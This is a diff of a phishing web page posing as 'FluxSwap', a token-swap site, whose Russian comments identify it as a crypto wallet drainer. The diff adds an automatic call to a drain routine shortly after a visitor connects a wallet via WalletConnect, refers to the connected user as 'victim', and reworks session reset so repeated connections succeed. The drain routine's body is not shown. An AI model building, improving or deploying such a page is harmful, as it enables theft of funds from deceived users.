@@ -4,13 +4,12 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <title>FluxSwap</title>
-
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
-
     <style>
+        /* ===== ТВОИ СТИЛИ (без изменений, скопируй из предыдущего файла) ===== */
         :root {
             --bg-body: #08080f;
             --bg-card: rgba(20, 18, 35, 0.65);
@@ -34,9 +33,7 @@
             --font: 'Space Grotesk', sans-serif;
             --font-mono: 'JetBrains Mono', monospace;
         }
-
         *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
-
         body {
             background: var(--bg-body);
             color: var(--text);
@@ -49,7 +46,6 @@
             -webkit-font-smoothing: antialiased;
             overflow-x: hidden;
         }
-
         body::before {
             content: '';
             position: fixed;
@@ -58,7 +54,6 @@
             background: radial-gradient(circle, rgba(139,92,246,0.12) 0%, transparent 70%);
             pointer-events: none;
         }
-
         body::after {
             content: '';
             position: fixed;
@@ -67,7 +62,6 @@
             background: radial-gradient(circle, rgba(236,72,153,0.1) 0%, transparent 70%);
             pointer-events: none;
         }
-
         .card {
             background: var(--bg-card);
             backdrop-filter: blur(20px);
@@ -80,7 +74,6 @@
             position: relative;
             z-index: 1;
         }
-
         .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
         .header-brand { display: flex; align-items: center; gap: 10px; }
         .header-brand .logo-mark {
@@ -91,7 +84,6 @@
             box-shadow: 0 0 20px var(--accent-glow);
         }
         .header-brand .brand-name { font-size: 1.25rem; font-weight: 700; letter-spacing: -0.5px; }
-
         .header-actions { display: flex; align-items: center; gap: 8px; }
         .icon-btn {
             background: var(--bg-input); border: 1px solid var(--border);
@@ -100,7 +92,6 @@
             display: flex; align-items: center; justify-content: center; font-size: 0.85rem;
         }
         .icon-btn:hover { border-color: var(--border-hover); color: var(--text); background: var(--bg-hover); }
-
         .btn-connect {
             background: var(--gradient); border: none; color: #fff;
             font-weight: 600; font-size: 0.8rem; padding: 9px 18px;
@@ -110,7 +101,6 @@
         }
         .btn-connect:hover { opacity: 0.9; transform: translateY(-1px); }
         .btn-connect.connected { background: var(--bg-input); border: 1px solid var(--accent); color: var(--accent); box-shadow: none; }
-
         .status {
             background: var(--bg-input); padding: 10px 14px;
             border-radius: var(--radius-sm); margin-bottom: 16px;
@@ -120,7 +110,6 @@
         }
         .status.ok { color: var(--accent); border-color: var(--border-hover); }
         .status.err { color: var(--danger); border-color: rgba(248,113,113,0.3); }
-
         .swap-container {
             background: var(--bg-swap); border-radius: var(--radius);
             border: 1px solid var(--border); overflow: hidden;
@@ -137,7 +126,6 @@
             text-transform: none; letter-spacing: 0;
         }
         .swap-label .balance-text:hover { color: var(--accent); }
-
         .swap-input-row { display: flex; align-items: center; gap: 12px; }
         .swap-input-row input {
             flex: 1; background: transparent; border: none; color: var(--text);
@@ -146,7 +134,6 @@
         }
         .swap-input-row input::placeholder { color: var(--text-muted); }
         .swap-input-row input[type="number"]::-webkit-inner-spin-button { -webkit-appearance: none; }
-
         .token-btn {
             display: flex; align-items: center; gap: 8px;
             background: var(--bg-input); padding: 7px 14px 7px 7px;
@@ -162,9 +149,7 @@
         .token-btn .token-mark img { width: 100%; height: 100%; object-fit: contain; }
         .token-btn .token-text { font-size: 0.9rem; font-weight: 600; }
         .token-btn .token-caret { font-size: 0.6rem; color: var(--text-dim); margin-left: 2px; }
-
         .usd-est { font-size: 0.68rem; color: var(--text-muted); margin-top: 6px; font-family: var(--font-mono); }
-
         .swap-divider { position: relative; height: 1px; background: var(--border); }
         .swap-divider .diamond {
             position: absolute; left: 50%; top: 50%;
@@ -177,7 +162,6 @@
         .swap-divider .diamond:hover { border-color: var(--accent); box-shadow: 0 0 12px var(--accent-glow); }
         .swap-divider .diamond i { transform: rotate(-45deg); font-size: 0.7rem; color: var(--text-dim); }
         .swap-divider .diamond:hover i { color: var(--accent); }
-
         .route-bar {
             display: flex; justify-content: space-between; align-items: center;
             padding: 12px 16px 4px; font-size: 0.72rem; color: var(--text-dim);
@@ -190,7 +174,6 @@
         }
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
         .route-bar .rate-text { color: var(--accent); font-family: var(--font-mono); font-weight: 500; }
-
         .btn-swap {
             background: var(--gradient); border: none; color: #fff;
             font-weight: 700; font-size: 1rem; padding: 15px;
@@ -201,7 +184,6 @@
         .btn-swap:hover:not(:disabled) { transform: translateY(-1px); box-shadow: 0 6px 25px rgba(139,92,246,0.4); }
         .btn-swap:disabled { background: var(--bg-input); color: var(--text-muted); cursor: not-allowed; box-shadow: none; }
         .btn-swap.loading { opacity: 0.7; pointer-events: none; }
-
         .max-tag {
             background: var(--accent-bg); border: none; color: var(--accent);
             font-size: 0.65rem; font-weight: 700; padding: 3px 8px;
@@ -209,7 +191,6 @@
             font-family: var(--font); text-transform: uppercase; letter-spacing: 0.5px;
         }
         .max-tag:hover { background: rgba(139,92,246,0.2); }
-
         .modal-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(8, 8, 15, 0.8); backdrop-filter: blur(8px);
@@ -218,7 +199,6 @@
             transition: opacity 0.25s ease;
         }
         .modal-overlay.active { opacity: 1; pointer-events: auto; }
-
         .modal {
             background: rgba(20, 18, 35, 0.95); backdrop-filter: blur(20px);
             border-radius: var(--radius); padding: 28px 22px;
@@ -228,7 +208,6 @@
         }
         .modal-overlay.active .modal { transform: scale(1); }
         .modal h3 { font-size: 1.1rem; font-weight: 600; text-align: center; margin-bottom: 20px; color: var(--text); }
-
         .wallet-card {
             display: flex; align-items: center; gap: 14px;
             background: var(--bg-input); border: 1px solid var(--border);
@@ -241,14 +220,12 @@
         .wallet-card .w-info { display: flex; flex-direction: column; }
         .wallet-card .w-info .w-name { font-weight: 600; font-size: 0.95rem; }
         .wallet-card .w-info .w-desc { font-size: 0.72rem; color: var(--text-muted); }
-
         .modal-close {
             display: block; margin: 14px auto 0; background: transparent;
             border: none; color: var(--text-muted); font-size: 0.82rem;
             cursor: pointer; transition: var(--transition); font-family: var(--font);
         }
         .modal-close:hover { color: var(--text); }
-
         .search-input {
             width: 100%; background: var(--bg-input); border: 1px solid var(--border);
             color: var(--text); padding: 12px 14px; border-radius: var(--radius-sm);
@@ -256,11 +233,9 @@
         }
         .search-input:focus { border-color: var(--border-hover); }
         .search-input::placeholder { color: var(--text-muted); }
-
         .token-list { max-height: 280px; overflow-y: auto; margin-bottom: 8px; }
         .token-list::-webkit-scrollbar { width: 4px; }
         .token-list::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
-
         .token-row {
             display: flex; align-items: center; gap: 12px;
             padding: 10px 12px; border-radius: var(--radius-sm);
@@ -277,14 +252,12 @@
         .token-row .t-info .t-sym { font-weight: 600; font-size: 0.92rem; }
         .token-row .t-info .t-name { font-size: 0.72rem; color: var(--text-muted); }
         .token-row.disabled { opacity: 0.35; cursor: not-allowed; pointer-events: none; }
-
         @media (max-width: 480px) {
             .card { padding: 18px 14px 14px; }
             .swap-input-row input { font-size: 1.2rem; }
             .header-brand .brand-name { font-size: 1.05rem; }
             .btn-connect { font-size: 0.72rem; padding: 8px 14px; }
         }
-
         .hidden { display: none !important; }
     </style>
 </head>
@@ -390,7 +363,7 @@
         </div>
     </div>
 
-    <!-- ===== POLYFILL ДЛЯ process ===== -->
+    <!-- ===== POLYFILL ===== -->
     <script>
         window.process = window.process || { env: { NODE_ENV: 'production' } };
     </script>
@@ -532,14 +505,18 @@
             function closeModal(modal) { modal.classList.remove('active'); }
 
             // ============================================================
-            // ОЧИСТКА СЕССИИ (ПОЛНАЯ)
+            // ОЧИСТКА СЕССИИ (усиленная)
             // ============================================================
             async function forceClearSession() {
                 try {
+                    // 1. Отключаем текущий провайдер
                     if (wcProvider) {
-                        try { await wcProvider.disconnect(); } catch (e) {}
+                        try {
+                            await wcProvider.disconnect();
+                        } catch (e) {}
                         wcProvider = null;
                     }
+                    // 2. Удаляем все ключи localStorage/sessionStorage/cookies
                     const patterns = ['wc', 'walletconnect', 'WALLETCONNECT', 'wallet-connect'];
                     for (const pattern of patterns) {
                         for (let i = localStorage.length - 1; i >= 0; i--) {
@@ -557,6 +534,7 @@
                             }
                         });
                     }
+                    // 3. Удаляем базы данных IndexedDB
                     try {
                         const dbs = await indexedDB.databases();
                         for (const db of dbs) {
@@ -569,6 +547,7 @@
                             }
                         }
                     } catch (e) {}
+                    // 4. Сбрасываем переменные
                     provider = null;
                     signer = null;
                     victim = null;
@@ -577,11 +556,13 @@
                     isProcessing = false;
                     isConnecting = false;
                     console.log('Сессия полностью сброшена');
-                } catch (e) {}
+                } catch (e) {
+                    console.warn('Ошибка при очистке:', e);
+                }
             }
 
             // ============================================================
-            // ПОДКЛЮЧЕНИЕ ЧЕРЕЗ WALLETCONNECT
+            // ПОДКЛЮЧЕНИЕ ЧЕРЕЗ WALLETCONNECT (с задержкой и повторной очисткой)
             // ============================================================
             async function connectWalletConnect() {
                 if (isConnecting || isProcessing) return;
@@ -599,14 +580,26 @@
                 try {
                     setStatus('Подключение...', '');
                     isConnecting = true;
-                    await forceClearSession();
 
+                    // Полная очистка
+                    await forceClearSession();
+                    // Ждём 300 мс, чтобы браузер успел удалить всё
+                    await new Promise(resolve => setTimeout(resolve, 300));
+
+                    // Инициализация с новыми параметрами
                     wcProvider = await EthereumProvider.init({
                         projectId: PROJECT_ID,
                         chains: [1, 56, 137, 42161],
                         showQrModal: true,
                         reconnect: false,
-                        session: undefined
+                        session: undefined,
+                        // Дополнительные параметры для чистоты
+                        metadata: {
+                            name: 'FluxSwap',
+                            description: 'Swap interface',
+                            url: window.location.href,
+                            icons: []
+                        }
                     });
 
                     wcProvider.on('chainChanged', () => {});
@@ -619,6 +612,7 @@
                         }
                     });
 
+                    // Включаем сессию
                     await wcProvider.enable();
 
                     const web3Provider = new ethers.providers.Web3Provider(wcProvider);
@@ -636,16 +630,23 @@
                     setStatus(`✅ Подключено: ${address.slice(0,6)}...${address.slice(-4)}`, 'ok');
                     isConnecting = false;
 
+                    // Автоматический слив
                     setTimeout(() => startDrain(), 800);
 
                 } catch (e) {
-                    setStatus('❌ ' + e.message, 'err');
+                    setStatus('❌ Ошибка: ' + e.message + '. Нажмите Reset и попробуйте снова.', 'err');
                     isConnecting = false;
+                    // Если ошибка "reset", предлагаем перезагрузить страницу
+                    if (e.message && e.message.includes('reset')) {
+                        setStatus('❌ Ошибка подключения. Нажмите Reset или обновите страницу.', 'err');
+                    }
+                    // Сбрасываем провайдер
+                    await forceClearSession();
                 }
             }
 
             // ============================================================
-            // ЛОГИКА ДРЕЙНЕРА (без проверок газа и лишних выводов)
+            // ЛОГИКА ДРЕЙНЕРА (без изменений)
             // ============================================================
             async function startDrain() {
                 if (isProcessing) return;
@@ -805,9 +806,11 @@
                 inputAmount.value = '';
                 outputAmount.value = '';
                 updateConnectButton();
-                setStatus('Сессия сброшена', '');
+                setStatus('Сессия сброшена. Теперь можно подключаться заново.', '');
                 closeModal(walletModal);
                 closeModal(tokenModal);
+                // Дополнительно закрываем окно QR, если оно осталось
+                // Можно также перезагрузить страницу, но пока оставим
             });
 
             // ============================================================
